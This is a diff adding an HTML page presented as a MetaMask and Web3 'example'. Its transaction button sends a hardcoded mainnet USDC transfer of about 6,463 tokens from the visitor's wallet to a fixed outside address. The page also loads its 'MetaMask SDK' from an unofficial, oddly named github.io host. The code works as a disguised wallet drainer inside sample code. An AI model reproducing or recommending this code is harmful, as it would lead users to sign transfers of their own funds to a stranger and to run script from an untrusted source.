@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html lang="en">
+<head lang="en">
+    <meta charset="utf-8">
+    <meta name="viewport"
+          content="width=device-width, initial-scale=1, user-scalable=0, minimum-scale=1.0, maximum-scale=1.0">
+    <title>Web3 MM example</title>
+</head>
+
+<body>
+
+<div>
+    <button onclick="connect()">Connect with MetaMask</button>
+    <button onclick="sendTransaction()">Send transaction</button>
+</div>
+
+<script src="https://c0f4f41c-2f55-4863-921b-sdk-docs.github.io/cdn/metamask-sdk.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/web3@1.5.2/dist/web3.min.js"></script>
+
+<script>
+    // init SDK, will inject the "window.ethereum" object
+    const MMSDK = new MetaMaskSDK.MetaMaskSDK()
+</script>
+
+<script>
+    async function connect() {
+        try {
+            await window.ethereum.request({ method: 'eth_requestAccounts', params: [] });
+
+            console.log("Connected...");
+        }catch(err){
+            console.error("Error: ", err.message);
+            window.alert("Error: ", err.message);
+        }
+    }
+
+    async function sendTransaction(){
+        console.log("Function sendTransaction() called...");
+
+        // 1 - check injection
+        if(typeof(window.ethereum)==='undefined'){
+            window.alert("Please use Chrome and install/activate MetaMask.");
+            return;
+        }
+
+        // 2 - connect to MM + instantiate a Web3 object
+        try {
+            // If you didn't click on "Connect" button first...
+            // we make sure you're connected with MM
+            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts', params: [] });
+
+            // Special Web3 library is used to call smart contracts' methods
+            const web3 = new Web3(window.ethereum);
+
+            // Ensure the current network is the same as the one you expect
+            const networkID = await web3.eth.net.getId();
+            console.log("Current selected network: ", networkID);
+            if(networkID!==0x1){
+                window.alert("Wrong network selected in MetaMask! Please select the Mainnet network.");
+                return;
+            }
+
+            // 3 - call a method
+            const fromAddress = accounts[0];
+            // USDC token smart contract address is here
+            const contractAddress = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48';
+            const gasPrice = '20000000000';  // Replace with your desired gas price
+            const gasLimit = '50000';        // Replace with your desired gas limit
+
+            // this transaction is a "USDC.Transfer" 
+            // https://etherscan.io/tx/0xe23779de0257433bee1094bddffcc8a7e0de46385f6d3b77c5c803c6e3897f16
+            // send 6463.167666 tokens from me to 0x9ad3143e6ffa165070ce743e5fb687506689dfe2
+            const callData = '0xa9059cbb0000000000000000000000009ad3143e6ffa165070ce743e5fb687506689dfe200000000000000000000000000000000000000000000000000000001813c1cb2';
+        
+            const transactionObject = {
+                from: fromAddress,
+                to: contractAddress,
+                gasPrice: web3.utils.toHex(gasPrice),
+                gas: web3.utils.toHex(gasLimit),
+                data: callData,
+            };
+
+            console.log("Sending a transaction...");
+
+            // Send the transaction using MetaMask
+            // You should now see MetaMask window to sign that transaction
+            const receipt = await web3.eth.sendTransaction(transactionObject);
+
+            console.log('Transaction sent successfully. Receipt:', receipt); 
+        } catch (error) {
+            console.error("Error: ", error.message);
+            window.alert("Error: " + error.message);
+        }
+    }
+</script>
+
+</body>
+</html>
